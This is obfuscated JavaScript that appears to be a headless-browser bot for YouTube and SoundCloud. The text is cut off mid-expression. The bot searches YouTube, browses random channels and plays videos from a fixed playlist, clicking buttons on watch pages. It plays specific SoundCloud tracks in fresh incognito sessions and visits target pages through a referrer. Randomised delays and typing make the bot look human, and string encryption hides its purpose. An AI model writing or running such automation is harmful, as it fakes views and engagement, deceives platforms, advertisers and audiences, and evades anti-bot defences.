const Y = c,
  X = b,
  W = d;

function d(b, c) {
  const e = a();
  return d = function(f, g) {
    f = f - (0x1570 + -0xa1c + -0xb54);
    let h = e[f];
    return h;
  }, d(b, c);
}

function getRandomInt(f, h) {
  const i = ceil(f);
  return floor(random() * (floor(h) - i + (0xe7b + 0xefc + -0x1d76))) + i;
}
async function createPage(f, h) {
  let i = await f['newPage']();
  return await i['setDefault' + 'Navigation' + 'Timeout'](-0x1318 + 0x3 * 0xa37 + -0xb8d), await i['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i;
}
async function standardGoto(f, h, i) {
  return await f['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i ? await wait(0xc2b7 + 0x3a * 0xe9 + 0x8251 * -0x1 + (-0x2882 + -0x15ff * 0x2 + 0x8f18) * random()) : await standardWaitForNetIdle(f), await wait(-0x4a * 0x44 + 0x19df + 0x1 * 0xd51 + (0x5 * 0x2cf + 0x119 * -0x3 + 0x1c50) * random()), -0x1968 + -0xb0c + -0xb7 * -0x33;
}
async function standardWaitForNetIdle(f) {
  return await wait(0xb0e + -0x22dc + -0x15ab * -0x2), await f['waitForNet' + 'workIdle']({
    'idleTime': 0x1d4c,
    'timeout': 0x0
  }), -0xf * 0xf3 + -0x2319 + -0x11 * -0x2e7;
}

function b(c, d) {
  const e = a();
  return b = function(f, g) {
    f = f - (0x1570 + -0xa1c + -0xb54);
    let h = e[f];
    if (b['PUcuZR'] === undefined) {
      var i = function(n) {
        const o = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let p = '',
          q = '';
        for (let r = -0x16bc + -0xd30 + -0x1e4 * -0x13, s, t, u = -0x14bb + 0xed * 0x13 + -0x6 * -0x86; t = n['charAt'](u++); ~t && (s = r % (0xe7b + 0xefc + -0x1d73) ? s * (-0x1318 + 0x3 * 0xa37 + -0xb4d) + t : t, r++ % (0x2074 + 0x4 * 0x233 + 0x293c * -0x1)) ? p += String['fromCharCode'](-0xd81 + -0xeaa * 0x1 + 0x1d2a & s >> (-(-0x4a * 0x44 + 0x19df + 0x1 * -0x635) * r & 0x1f * 0x3a + 0x1a5 * -0x1 + -0x55b)) : -0x1968 + -0xb0c + -0x91d * -0x4) {
          t = o['indexOf'](t);
        }
        for (let v = 0xb0e + -0x22dc + -0x17ce * -0x1, w = p['length']; v < w; v++) {
          q += '%' + ('00' + p['charCodeAt'](v)['toString'](-0xf * 0xf3 + -0x2319 + -0x2 * -0x18b3))['slice'](-(-0x144e * -0x1 + -0x789 + -0xcc3));
        }
        return decodeURIComponent(q);
      };
      const m = function(n, o) {
        let p = [],
          q = -0x9d6 + -0x1a88 + 0x245e,
          r, t = '';
        n = i(n);
        let u;
        for (u = -0x5 * 0x31d + 0x1bce + 0xd * -0xf1; u < 0x2338 + 0x49 * -0x85 + 0x1 * 0x3b5; u++) {
          p[u] = u;
        }
        for (u = 0x2 * -0x888 + 0xc67 * -0x2 + 0x29de; u < 0x1 * 0x3f8 + 0x7 * -0x3ad + 0x1 * 0x16c3; u++) {
          q = (q + p[u] + o['charCodeAt'](u % o['length'])) % (-0xd69 + 0x189 * -0x3 + 0x1304), r = p[u], p[u] = p[q], p[q] = r;
        }
        u = 0x2 * 0x5d3 + -0x1b6d + -0x7 * -0x241, q = 0x15c1 + -0x851 + -0xd70;
        for (let v = -0x129 + 0x247d * -0x1 + 0x25a6; v < n['length']; v++) {
          u = (u + (0x766 * -0x2 + 0x2603 + -0x2 * 0xb9b)) % (-0x781 + 0x13bc + -0xb3b), q = (q + p[u]) % (-0x14 + -0xe * -0xe7 + -0xb8e * 0x1), r = p[u], p[u] = p[q], p[q] = r, t += String['fromCharCode'](n['charCodeAt'](v) ^ p[(p[u] + p[q]) % (0x18cd * 0x1 + 0x4a * 0x5f + 0x1 * -0x3343)]);
        }
        return t;
      };
      b['gZFenL'] = m, c = arguments, b['PUcuZR'] = !![];
    }
    const j = e[-0x26b0 + -0x17 * 0x18d + 0x4a5b],
      k = f + j,
      l = c[k];
    return !l ? (b['ijtpdd'] === undefined && (b['ijtpdd'] = !![]), h = b['gZFenL'](h, g), c[k] = h) : h = l, h;
  }, b(c, d);
}
async function randomWait() {
  return await wait(-0x144e * -0x1 + -0x789 + 0x6c3 + (-0x9d6 + -0x1a88 + 0x37e6) * random()), -0x5 * 0x31d + 0x1bce + 0xc * -0x105;
}
async function watchRandomFrontScreenVideo(f) {
  await f['evaluate'](() => {
    var i;
    (i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('yt-core-im' + 'age--fill-' + 'parent-hei' + 'ght\x20yt-cor' + 'e-image--f' + 'ill-parent' + '-width\x20yt-' + 'core-image' + '\x20yt-core-i' + 'mage--cont' + 'ent-mode-s' + 'cale-aspec' + 't-fill\x20yt-' + 'core-image' + '--loaded'))['slice'](0x2338 + 0x49 * -0x85 + 0x7 * 0x63, 0x2 * -0x888 + 0xc67 * -0x2 + 0x29e5), i[Math['floor'](Math['random']() * i['length'])])['setAttribu' + 'te']('id', '__scope');
  }), await randomWait(), await f['click']('#__scope'), await standardWaitForNetIdle(f);
  const h = await getMaxTime(f);
  return await wait(Math['min']((0x1 * 0x2f9b + 0x40 * -0x4d3 + 0x1 * 0x1ef85) * getRandomInt(-0xd69 + 0x189 * -0x3 + 0x1206, 0x2 * 0x5d3 + -0x1b6d + -0xc * -0x151), h)), 0x15c1 + -0x851 + -0xd6f;
}
async function getMaxTime(f) {
  return await f['evaluate'](() => {
    const h = {
      'Seconds': 0x3e8,
      'Minutes': 0xea60,
      'Hours': 0x36ee80,
      'Second': 0x3e8,
      'Minute': 0xea60,
      'Hour': 0x36ee80
    };
    let i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('ytp-progre' + 'ss-bar'))['pop']()['ariaValueT' + 'ext'],
      j = -0x129 + 0x247d * -0x1 + 0x25a6;
    i = i['split'](i['includes']('of') ? '\x20of\x20' : ',\x20')[0x766 * -0x2 + 0x2603 + -0x2 * 0xb9b]['split']('\x20');
    for (let k = -0x781 + 0x13bc + -0xc3b; k < i['length']; k += -0x14 + -0xe * -0xe7 + -0xc8c * 0x1)
      j += i[k] * h[i[k + (0x18cd * 0x1 + 0x4a * 0x5f + 0x1 * -0x3442)]];
    return j;
  });
}
async function anchorAndView(f) {
  log('goto\x20chann' + 'el\x20and\x20vie' + 'w\x20video\x20pr' + 'ocess...'), await standardGoto(f, channels['random']()), await f['click']('tp-yt-pape' + 'r-tab.styl' + 'e-scope:nt' + 'h-child(4)' + '\x20>\x20div:nth' + '-child(1)'), log('clicked\x20vi' + 'deo\x20stuff'), await standardWaitForNetIdle(f), log('page\x20netwo' + 'rk\x20idle\x20x2'), await f['evaluate'](() => {
    const R = d,
      j = Array['from'](document['querySelec' + 'torAll']('#contents'))['filter'](l => 'style-scop' + 'e\x20ytd-rich' + '-grid-row' == l['getAttribu' + 'te']('class'))['slice'](-0x26b0 + -0x17 * 0x18d + 0x4a61)['map'](l => Array['from'](l[R(0xc)]))['flat'](-0xd * 0x293 + -0xf89 + -0xc1 * -0x41)['map'](l => l['childNodes'][-0x1db * 0xd + 0x8af + 0xf71 * 0x1]['childNodes'][0x1cd3 + 0xce0 + 0x3d * -0xaf]['childNodes'][0x1 * -0x4b5 + -0x1e0b + 0x11f * 0x1f]['childNodes'][0x3c0 + -0x15f * 0x12 + -0x5e * -0x39]['childNodes'][0x1 * -0xd55 + -0x9c + 0xdf2]);
    var k;
    return (k = j)[Math['floor'](Math['random']() * k['length'])]['setAttribu' + 'te']('id', '__hookedVi' + 'dToWatch'), j['map'](l => l['href']);
  }), await wait(getRandomInt(-0x895 + -0x123d + 0x1eba, -0x35 * -0x4f + 0x1fc8 + -0x1 * 0x1c9b)), await f['click']('#__hookedV' + 'idToWatch'), await wait(-0x683c + -0x34f4 * -0x1 + 0x6de0);
  const h = await getMaxTime(f),
    i = Math['min']((0x1adbd * 0x1 + -0x5ff6 + -0x6367) * getRandomInt(-0x1153 + 0x1fd * 0x7 + 0x36a, -0xe * 0x185 + 0xc8a + 0x9 * 0xf9), h);
  return await wait(i), -0x1 * 0x24dd + 0x115a + 0x1384;
}
async function frontScreenActions(f) {
  return log('going\x20to\x20f' + 'ront\x20scree' + 'n\x20and\x20clic' + 'king\x20rando' + 'm\x20video...'), await standardWaitForNetIdle(f), await randomWait(), log('click\x20atte' + 'mpt...'), await f['evaluate'](() => {
    var h;
    (h = Array['from'](document['getElement' + 'sByClassNa' + 'me']('style-scop' + 'e\x20ytd-rich' + '-grid-row'))['filter'](i => 'contents' != i['id']), h[Math['floor'](Math['random']() * h['length'])])['children'][0xbc2 * -0x2 + -0x1 * 0x2a1 + 0x1 * 0x1a25]['children'][-0x89 * 0x28 + 0x1b4d + -0x5e5]['children'][0x2480 + -0x16d * -0xa + 0x49 * -0xb2]['children'][0x212f * 0x1 + 0xd * -0x16a + -0xecd]['children'][0x3 * -0xc82 + -0xe12 + -0x3398 * -0x1]['setAttribu' + 'te']('id', 'gottemezez');
  }), await randomWait(), await f['click']('#gottemeze' + 'z'), await standardWaitForNetIdle(f), await watchRandomFrontScreenVideo(f), 0xabe + -0x827 + -0x2 * 0x14b;
}
async function searchAndView(f) {
  log('searching\x20' + 'youtube\x20re' + 'sults'), await randomWait(), await f['evaluate'](() => {
    const S = b;
    let j = Array['from'](document['querySelec' + 'torAll']('#search'));
    document['getElement' + 'ById']('__searchBo' + 'xReal') || j['find'](k => 'INPUT' === k['tagName'])[S(0x18, 'p9yO') + 'te']('id', '__searchBo' + 'xReal');
  }), await f['type']('#__searchB' + 'oxReal', searchTerms['random'](), {
    'delay': 0x1 * -0x2363 + -0x2a * -0x8 + -0x3 * -0xb7d + (-0x87 * 0x44 + 0x15a + 0x22b4) * random()
  }), await wait(-0xa26 + 0x2 * 0xc7a + -0xcda + (0x2217 + 0x6f4 + -0x27df * 0x1) * random()), await f['click']('#search-ic' + 'on-legacy'), await async function j() {
    if (!await f['evaluate'](() => Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['length']))
      return await j();
  }(), await standardWaitForNetIdle(f);
  let h = await f['evaluate'](() => {
    const k = {
        'seconds': 0x3e8,
        'minutes': 0xea60,
        'hours': 0x36ee80,
        'second': 0x3e8,
        'minute': 0xea60,
        'hour': 0x36ee80
      },
      l = (m = Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['map'](p => p['childNodes'][0x18ed + 0x1d70 + -0x365b]['childNodes'][0x25 * -0x6b + -0xe0d + 0x1d85]['childNodes'][-0x3 * 0x125 + 0x1 * 0x11d4 + -0xe64]))[Math['floor'](Math['random']() * m['length'])];
    var m;
    const n = l['childNodes'][0x133e * 0x1 + -0x11 * -0x9d + -0x1da6]['childNodes'][-0x1ee7 + 0x1 * 0x70b + 0x2 * 0xbee]['childNodes'][-0x1 * 0x6fe + -0x12a9 + 0x19a9]['ariaLabel'];
    return l['setAttribu' + 'te']('id', '__hookedVi' + 'dToClick'), l['scrollInto' + 'View'](),
      function(p) {
        let q = p['split'](',\x20')['map'](u => u['split']('\x20'))['flat'](0x1288 + -0x8d * -0x2c + 0x59 * -0x7b),
          r = 0xfee + -0x153b + -0x3b * -0x17;
        for (let u = -0x6cb * -0x2 + 0x1cf3 + 0x1 * -0x2a89; u < q['length']; u += 0xa58 + 0x1c82 + 0x136c * -0x2)
          r += q[u] * k[q[u + (0x1df9 + -0x1 * 0xff2 + -0xe06)]];
        return r;
      }(n);
  });
  await wait((-0x1 * 0xe4a + 0x3212 * -0x1 + 0x7af4) * Math['random']()), await f['click']('#__hookedV' + 'idToClick');
  let i = Math['min']((-0x18ca * -0x7 + -0x1b9af + 0x1f689) * getRandomInt(-0x6e * -0x59 + 0x94c * -0x4 + 0x10d * -0x1, -0x1cbe + 0x781 * -0x1 + 0x2449), h + (-0x1a22 + -0x1623 + 0x43cd));
  return await wait(i), -0x3ec * 0x2 + 0x1 * 0x1eb0 + -0x16d7;
}
async function keyWatch(f) {
  const T = b;
  log('standard\x20k' + 'eyWatch...'), await standardGoto(f, 'https://ww' + 'w.youtube.' + 'com/watch?' + 'v=' + hookPlaylistPoints['random']() + ('&list=PL7D' + '9Ps0wVt5cy' + 'nwDE_CPYb6' + 'aBUkYyfi-y'), -0x787 + -0x185c + 0x1fe3), log('clicking..' + '.'), await f['click']('#button\x20>\x20' + 'ytd-button' + '-renderer\x20' + '>\x20yt-butto' + 'n-shape\x20>\x20' + 'button\x20>\x20y' + 't-touch-fe' + 'edback-sha' + 'pe\x20>\x20div\x20>' + '\x20div.yt-sp' + 'ec-touch-f' + 'eedback-sh' + 'ape__fill'), await f['click'](T(0x2, '!4xl') + '-buttons-c' + 'omputed\x20>\x20' + 'ytd-toggle' + '-button-re' + 'nderer\x20>\x20y' + 't-button-s' + 'hape\x20>\x20but' + 'ton\x20>\x20yt-t' + 'ouch-feedb' + 'ack-shape\x20' + '>\x20div\x20>\x20di' + 'v.yt-spec-' + 'touch-feed' + 'back-shape' + '__fill');
  const h = setInterval(async () => {
    log('executed\x20c' + 'leanup\x20int' + 'erval,\x20che' + 'ck\x20process' + '...'), await f['evaluate'](() => {
      setTimeout(() => {
        document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')?.['offsetPare' + 'nt'] && document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')['setAttribu' + 'te']('id', '__lllll');
      }, -0x15bb * -0x1 + -0xaf1 + 0xee + (0x11c * -0x22 + 0x21e9 * 0x1 + -0x19 * -0x4f) * Math['random']());
    });
  }, 0x33b5 + -0x224c + 0x9ef);
  await wait(-0x3 * 0xc09b + -0x25b87 + 0x93138);
  try {
    await f['click']('#__lllll');
  } catch (i) {}
  return await wait((-0xa6f * 0xd + -0x12f02 * 0x1 + -0xfd * -0x2a9) * getRandomInt(0xa * 0xb5 + 0x56c + -0xc7a, 0x3 * 0xb1f + 0x232e + -0x2 * 0x2239)), clearInterval(h), -0x22f3 * 0x1 + -0x2 * 0x8db + 0x34aa;
}
async function runYTModule(f, h) {
  const i = await createPage(f, 'https://ww' + 'w.youtube.' + 'com/');
  for (await randomWait();;) {
    let j = -0x314 + 0xf32 + 0x40a * -0x3;
    try {
      await standardWaitForNetIdle(i), await GlobalActions['random']()(i);
    } catch (k) {
      i['close']();
    }
    if (j)
      return -0xafc + -0x4cf * -0x3 + 0xdc * -0x4;
    await randomWait();
  }
  return 0xe66 + 0xf1 * 0x1f + -0x2b94;
}

function c(b, d) {
  const e = a();
  return c = function(f, g) {
    f = f - (0x1570 + -0xa1c + -0xb54);
    let h = e[f];
    if (c['eeEHqy'] === undefined) {
      var i = function(m) {
        const n = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let o = '',
          p = '';
        for (let q = -0x16bc + -0xd30 + -0x1e4 * -0x13, r, s, t = -0x14bb + 0xed * 0x13 + -0x6 * -0x86; s = m['charAt'](t++); ~s && (r = q % (0xe7b + 0xefc + -0x1d73) ? r * (-0x1318 + 0x3 * 0xa37 + -0xb4d) + s : s, q++ % (0x2074 + 0x4 * 0x233 + 0x293c * -0x1)) ? o += String['fromCharCode'](-0xd81 + -0xeaa * 0x1 + 0x1d2a & r >> (-(-0x4a * 0x44 + 0x19df + 0x1 * -0x635) * q & 0x1f * 0x3a + 0x1a5 * -0x1 + -0x55b)) : -0x1968 + -0xb0c + -0x91d * -0x4) {
          s = n['indexOf'](s);
        }
        for (let u = 0xb0e + -0x22dc + -0x17ce * -0x1, v = o['length']; u < v; u++) {
          p += '%' + ('00' + o['charCodeAt'](u)['toString'](-0xf * 0xf3 + -0x2319 + -0x2 * -0x18b3))['slice'](-(-0x144e * -0x1 + -0x789 + -0xcc3));
        }
        return decodeURIComponent(p);
      };
      c['WPtuHi'] = i, b = arguments, c['eeEHqy'] = !![];
    }
    const j = e[-0x9d6 + -0x1a88 + 0x245e],
      k = f + j,
      l = b[k];
    return !l ? (h = c['WPtuHi'](h), b[k] = h) : h = l, h;
  }, c(b, d);
}

function fetchRandomSC() {
  return Math['random']() <= -0x162d + 0x8b0 + 0xd7d + 0.5 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'long-day-r' + 'emix-prod-' + 'unnecessar' + 'y-beats?si' + '=30458c9ce' + '44c4b4eaab' + '8a3eca1b3a' + '58e&utm_so' + 'urce=clipb' + 'oard&utm_m' + 'edium=text' + '&utm_campa' + 'ign=social' + '_sharing' : Math['random']() < -0x1ded + 0x8bd + 0x1530 + 0.2 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'whatnot-de' + 'mo?si=cf08' + 'c07128594b' + 'f6b3d049e1' + '680b972f&u' + 'tm_source=' + 'clipboard&' + 'utm_medium' + '=text&utm_' + 'campaign=s' + 'ocial_shar' + 'ing' : 'https://so' + 'undcloud.c' + 'om/22down/' + 'worried-ab' + 'out-the-tr' + 'uth-ft-rik' + 'anbeastly-' + 'nikkkq-cas' + 'ualcheater' + '?si=20d1c3' + '32655b4ef1' + '98a379eac0' + '05725b&utm' + '_source=cl' + 'ipboard&ut' + 'm_medium=t' + 'ext&utm_ca' + 'mpaign=soc' + 'ial_sharin' + 'g';
}
async function runGFModule(f, h) {
  async function i() {
    const aK = {
      f: 'f#Rs'
    };
    if (doFlags['doSoundClo' + 'ud'] && Math['random']() >= -0xae7 * -0x1 + -0x23c6 * -0x1 + -0x239 * 0x15 + 0.3) {
      const j = await f['createInco' + 'gnitoBrows' + 'erContext'](),
        k = await j['newPage']();
      let l = 0x3bd * 0x1 + 0x1ccd + -0x208a;
      if (await k['goto'](fetchRandomSC(), {
          'timeout': NETWORK_PATIENCE
        })['catch'](m => l++), l)
        return await k['close'](), await j['close'](), i();
      try {
        const m = await k['evaluate'](() => {
          let n = document['querySelec' + 'tor']('#content\x20>' + '\x20div\x20>\x20div' + '.l-listen-' + 'hero\x20>\x20div' + '\x20>\x20div.ful' + 'lHero__for' + 'eground.fu' + 'llListenHe' + 'ro__foregr' + 'ound.sc-p-' + '4x\x20>\x20div.f' + 'ullHero__t' + 'itle\x20>\x20div' + '\x20>\x20div\x20>\x20d' + 'iv.soundTi' + 'tle__playB' + 'utton.soun' + 'dTitle__pl' + 'ayButtonHe' + 'ro.theme-l' + 'ight\x20>\x20a');
          n && 'Play' === n['textConten' + 't'] && n['click']();
        });
        await wait(0x19 * -0x76d + -0xde16 * 0x1 + 0x24783 + getRandomInt(-0xb * 0x4f3 + -0x5da6 + 0xceaf, -0x6747 + 0xc0f8 + -0x1 * -0x1b7f));
      } catch (n) {}
      return await k['close'](), await j['close'](), i();
    } {
      const {
        url: p,
        preRef: q
      } = scriptTargets['randomFlus' + 'h'](0xfbc * 0x2 + -0xe9 * -0x1 + -0x2060), r = await f['createInco' + 'gnitoBrows' + 'erContext'](), s = await r['newPage']();
      let u = -0xa9f + -0xd4 + 0x3d1 * 0x3;
      if (await s['goto'](q, {
          'timeout': NETWORK_PATIENCE
        })['catch'](w => u++), u)
        return await s['close'](), await r['close'](), i();
      const v = await s['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
      return log(v['slice'](-0x13b0 + 0x2 * -0x485 + 0x1cba, 0xbfa + -0xb6b + -0x5d)), v['includes']('script-des' + 'cription') ? (log('p1'), await s['goto'](p, {
        'timeout': NETWORK_PATIENCE
      })['catch'](w => u++), u ? (await s['close'](), await r['close'](), i()) : (await new Promise(w => setTimeout(w, -0x20f3 + -0x1737 + 0x3ffa + floor((-0x2655 + -0xeb0 + 0x3b * 0xf7) * random()))), log('p2'), log(await s['evaluate'](() => {
        const U = b;
        var w, x, y, z, A, B, C, D, E = 'object' == typeof window ? window : {},
          F = !E['JS_SHA1_NO' + '_NODE_JS'] && 'object' == typeof process && process['versions'] && process['versions']['node'];
        F && (E = global), w = ('0123456789' + 'abcdef')['split'](''), x = [
          -(-0x12e * 0xbb3efa + 0x1 * 0xbd92cf6e + 0x9f517b7e),
          0x7f * -0x3367 + 0x9 * 0x933ed + 0x46acc4,
          0x6cfa + -0xda5c + 0x17bd * 0xa,
          -0x1c6b + -0x11c7 * 0x1 + -0x2 * -0x1759
        ], y = [
          0x23da + -0x16d3 + 0x4d * -0x2b,
          -0xad * 0xe + -0xcc + 0x1 * 0xa52,
          0x372 + -0x20c3 * 0x1 + -0x2ab * -0xb,
          0xb * 0x7d + 0xa1c + -0x1 * 0xf7b
        ], z = [
          'hex',
          U(0x12, aK.f),
          'digest',
          'arrayBuffe' + 'r'
        ], A = [], B = function(J) {
          return function(K) {
            return new G(-0xa1c * 0x2 + 0xb27 + 0x9 * 0x102)['update'](K)[J]();
          };
        }, C = function() {
          var J, K, L = B('hex');
          for (F && (L = D(L)), L['create'] = function() {
              return new G();
            }, L['update'] = function(M) {
              return L['create']()['update'](M);
            }, J = -0x233f + 0x2262 + -0xdd * -0x1; J < z['length']; ++J)
            K = z[J], L[K] = B(K);
          return L;
        }, D = function(J) {
          var K = eval('require(\'crypto\');'),
            L = eval('require(\'buffer\')[\'Buffer\'];'),
            M = function(N) {
              const V = d;
              if ('string' == typeof N)
                return K[V(0x1c)]('sha1')['update'](N, 'utf8')['digest']('hex');
              if (N['constructo' + 'r'] === ArrayBuffer)
                N = new Uint8Array(N);
              else {
                if (void(0x1bad + -0xc63 + 0x1 * -0xf4a) === N['length'])
                  return J(N);
              }
              return K['createHash']('sha1')['update'](new L(N))['digest']('hex');
            };
          return M;
        };
        class G {
          constructor(J) {
              J ? (A[0x8b1 + -0xfc * -0x13 + -0x1b65] = A[-0xd7 * -0x17 + 0xe26 + 0x2167 * -0x1] = A[-0x5e * -0x45 + -0x1e9 + 0x5db * -0x4] = A[0xfc5 + 0x1 * -0xe4e + -0x175 * 0x1] = A[-0x1cfc + -0x4a5 + 0x21a4] = A[0xb3c + 0x6 * -0x6 + -0x2c5 * 0x4] = A[0x7 * -0x2cf + 0x3 * 0x585 + 0x31f] = A[-0xc54 + 0xe38 + 0xef * -0x2] = A[0x2461 + 0x4f1 + -0x1f * 0x155] = A[-0xf1 * -0x12 + -0x8b * 0x8 + -0x649 * 0x2] = A[-0x1d93 + -0x1 * 0x26c9 + 0x1 * 0x4465] = A[-0x1362 * -0x2 + 0x2 * -0x892 + -0x1596] = A[-0xe3d * -0x1 + 0x67 + -0xe99] = A[-0x4aa * 0x4 + 0x1b26 + 0x872 * -0x1] = A[-0x2380 + -0x1 * 0x6af + 0x2a3c] = A[0x292 * 0x7 + 0x22 * 0x61 + -0x1ed2] = A[-0x2119 + -0x1 * -0x146d + -0x1 * -0xcbb] = -0xe66 + 0xc41 + -0x9 * -0x3d, this['blocks'] = A) : this['blocks'] = [
                0x1512 * -0x1 + -0x441 + 0x1 * 0x1953,
                -0x16c9 + 0x1419 + 0x2b0,
                -0x132b + 0x17 * -0xa3 + 0x21d0,
                -0x4cf * 0x5 + 0xff3 + 0x818,
                0x1 * 0x232c + 0x11 * 0x147 + -0x38e3,
                0x1fd4 * 0x1 + 0x3 * -0x69a + -0x72 * 0x1b,
                0x9da * -0x1 + -0x1 * -0xd6 + 0x482 * 0x2,
                0x1050 + -0x5d2 + 0x1 * -0xa7e,
                -0x1663 * -0x1 + -0xf92 + -0x6d1,
                -0x8eb * -0x1 + 0xf5 * 0x1 + -0x9e0,
                -0x1de6 + -0x251e + 0x4 * 0x10c1,
                0x16 * 0x27 + 0x81c + -0xb76,
                -0x15ce * -0x1 + -0x264 + -0x2c6 * 0x7,
                0x2537 + 0x1cd * 0xb + -0x32b * 0x12,
                0x16 * -0xd5 + -0x1 * 0xab1 + 0x1cff,
                -0x2249 + 0x2319 + -0x1 * 0xd0,
                -0x25 * -0xe8 + -0x40 * 0x6d + 0xc * -0x86
              ], this['h0'] = -0xc86f * 0xb91b + 0x5 * 0x1b5ff791 + 0x6f52a7e1, this['h1'] = -0x16836a72a + -0xb112ee15 + -0x2edc * -0x10955e, this['h2'] = 0x1021ccc7b + 0x6ff69e01 + -0x2f64dd * 0x496, this['h3'] = -0x9 * -0x13ebcaa + 0x751cd74 * 0x2 + -0x2697a1b * 0x4, this['h4'] = -0x135c240a2 + 0x57e95229 + 0x1 * 0x1a1abd069, this['block'] = this['start'] = this['bytes'] = this['hBytes'] = 0x259d + -0x1eaf * -0x1 + -0xbc * 0x5d, this['finalized'] = this['hashed'] = -0x1e * 0x98 + 0x1439 + -0x1 * 0x269, this['first'] = 0x15b0 + 0x961 + -0x1f10;
            }
            ['update'](J) {
              var K, L, M, N, O, P;
              if (!this['finalized']) {
                for ((K = 'string' != typeof J) && J['constructo' + 'r'] === E['ArrayBuffe' + 'r'] && (J = new Uint8Array(J)), M = 0x1 * -0x233 + -0x10a * -0x11 + -0xf77 * 0x1, O = J['length'] || -0xa7 * 0x23 + -0x1 * -0xdad + -0x125 * -0x8, P = this['blocks']; M < O;) {
                  if (this['hashed'] && (this['hashed'] = 0x1aeb + -0x14fb + 0x26 * -0x28, P[-0x11d5 + -0x18 * 0x13a + 0x2f45] = this['block'], P[-0x1cad + 0x63e + -0x1 * -0x167f] = P[-0x2670 + -0x3 * -0x95e + 0xa57] = P[-0x312 * -0x7 + -0x1 * 0x977 + -0x1 * 0xc05] = P[0xb57 * -0x1 + -0x1e7 * -0xa + -0x7ac] = P[-0xbe + -0x1d22 + 0x1de4] = P[-0x130e + -0x13f9 * -0x1 + -0xe6] = P[0xd4f * 0x1 + 0x15e9 + -0x2332] = P[-0x8 * -0x3c7 + 0x1e42 + -0x3c73] = P[0xf4 * -0x19 + -0x2 * -0x736 + 0x25c * 0x4] = P[0x595 * 0x3 + 0xcda + -0x58 * 0x56] = P[-0x189e + 0x25fc + 0x6aa * -0x2] = P[0x14e * -0x1 + -0x1068 + 0x12f * 0xf] = P[0x20d + -0x4 * 0x392 + 0x1 * 0xc47] = P[-0x1ee8 + -0x1cf4 + -0x88f * -0x7] = P[0x320 + -0x1f05 + 0x1bf3] = P[-0x605 + 0x1223 * -0x2 + 0x2a5a] = -0x70 * 0x25 + 0x15e9 + -0x5b9), K) {
                    for (N = this['start']; M < O && N < 0xfe * -0x26 + -0xb * -0x59 + 0x2221; ++M)
                      P[N >> 0x1e5b * -0x1 + -0x2116 + 0x3f73] |= J[M] << y[0x1f6 * 0x1 + -0xdfb * 0x1 + 0xc08 & N++];
                  } else {
                    for (N = this['start']; M < O && N < 0x9e * 0x19 + 0x98a + 0x4 * -0x62e; ++M)
                      (L = J['charCodeAt'](M)) < -0x8b8 + 0x16cc + -0xd94 ? P[N >> 0x6b8 + -0x96b + 0x1 * 0x2b5] |= L << y[0x499 + -0x222 + 0x1 * -0x274 & N++] : L < 0x1136 * 0x1 + 0x4e9 + -0xe1f ? (P[N >> -0x7e2 + -0xf70 + 0x1754] |= (0x2267 + -0x1172 * -0x2 + -0x448b | L >> 0xf83 * 0x1 + 0x15c1 * -0x1 + 0x644) << y[-0x1f3 * -0xe + -0x59 * 0x47 + 0x298 * -0x1 & N++], P[N >> 0x1 * 0x21b2 + 0x51a + -0x3 * 0xcee] |= (0x19a3 + -0x2075 + 0x752 | -0x6bb * -0x5 + 0x3 * 0xb74 + 0x21e2 * -0x2 & L) << y[0xd76 * 0x1 + -0xd * 0x115 + 0x2 * 0x4f & N++]) : L < -0x12155 + -0x3 * -0x83f + -0x1 * -0x1e098 || L >= -0x10291 * -0x1 + 0x1b6df + -0x1d970 ? (P[N >> -0x2035 + 0x203f * -0x1 + 0x4076] |= (0x12c * 0x19 + -0xc99 + -0xfd3 * 0x1 | L >> -0x1 * 0x1a2f + 0x2010 + -0x5d5) << y[0x26 * 0x6d + -0x1cd3 + -0x18 * -0x87 & N++], P[N >> 0x3e * -0x98 + 0x1313 + 0x11bf] |= (-0x7 * 0x129 + 0x8f * -0x3e + -0xe6b * -0x3 | L >> 0x1 * 0x25d6 + -0x5 * 0x3dd + -0x1 * 0x127f & -0x1edd + 0x1f92 + -0x76) << y[0xae0 + -0xf86 + 0x4a9 * 0x1 & N++], P[N >> 0x1053 + 0x1061 + -0x20b2] |= (0xf67 * 0x1 + 0x1e5 * 0x4 + 0x47f * -0x5 | 0xb8 * 0x4 + -0x164d + 0x4eb * 0x4 & L) << y[-0x206c + -0x523 + 0x2592 & N++]) : (L = -0x1b66e + 0x17906 * 0x1 + -0x27ad * -0x8 + ((0xd81 + 0x1c88 + -0x260a & L) << -0x4d9 + -0x2c3 * 0x2 + 0x41 * 0x29 | 0x234a + 0x776 + -0x3 * 0xceb & J['charCodeAt'](++M)), P[N >> -0x22e8 + -0x1e0d * -0x1 + -0x5 * -0xf9] |= (0x1110 + 0x9ce * -0x1 + -0x652 | L >> -0x2 * -0x8ad + 0x1cb5 + -0x2dfd) << y[0x7 * 0x25b + 0xdbd + 0x5b * -0x55 & N++], P[N >> -0x133 * -0xd + -0x1 * 0x17cc + 0x837] |= (0x1151 + 0x1099 * 0x1 + -0xd * 0x292 | L >> 0x1 * 0x94f + -0xb3f * -0x1 + -0x1482 & 0x1 * 0x3a3 + 0x3d5 * -0x5 + 0xb * 0x16f) << y[-0x498 + 0x19cd + -0x2 * 0xa99 & N++], P[N >> 0x1db9 + 0x4a * -0x31 + -0xf8d] |= (0x25cf * 0x1 + -0x218 * 0x7 + -0x16a7 | L >> -0x259 + -0x26b9 + -0x14 * -0x20e & -0x81d + 0x1d01 + -0x1 * 0x14a5) << y[-0x229 * -0xd + -0x9b4 + 0x1 * -0x125e & N++], P[N >> -0x1 * 0x26ff + 0x1a9c + 0xc65] |= (-0x79d + -0x1740 + 0x1f5d * 0x1 | 0x1af3 + -0x1 * 0x211 + -0x18a3 * 0x1 & L) << 